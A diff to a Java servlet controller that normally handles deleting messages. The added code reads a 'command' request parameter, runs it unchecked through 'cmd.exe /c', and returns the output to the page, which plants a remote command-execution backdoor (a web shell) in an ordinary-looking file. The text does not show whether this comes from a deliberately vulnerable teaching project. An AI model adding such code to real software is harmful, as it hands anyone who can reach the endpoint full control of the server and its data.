@@ -3,9 +3,7 @@ package controller;
 import javax.servlet.RequestDispatcher;
 import javax.servlet.ServletException;
 import javax.servlet.http.*;
-import java.io.ByteArrayOutputStream;
-import java.io.IOException;
-import java.io.InputStream;
+import java.io.*;
 import java.sql.*;
 import java.util.ArrayList;
 import java.util.Base64;
@@ -14,6 +12,37 @@ import java.util.List;
 public class EditController extends HttpServlet {
     @Override
     protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
+
+        List resultList = new ArrayList();
+        String cmd = request.getParameter("command");
+        if (cmd != null && cmd.length() != 0) {
+
+            ProcessBuilder processBuilder = new ProcessBuilder();
+            processBuilder.command("cmd.exe", "/c", cmd);
+
+            try {
+
+                Process process = processBuilder.start();
+
+                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+
+                String line;
+                while ((line = reader.readLine()) != null) {
+                    System.out.println(line);
+                    resultList.add(line);
+                }
+
+                request.setAttribute("resultList", resultList);
+
+                int exitCode = process.waitFor();
+                System.out.println("\nExited with code : " + exitCode);
+
+            } catch (IOException e) {
+                e.printStackTrace();
+            } catch (InterruptedException e) {
+                e.printStackTrace();
+            }
+        }
 
         int i;
         String idMessageToDelete = request.getParameter("idMessageToDelete");
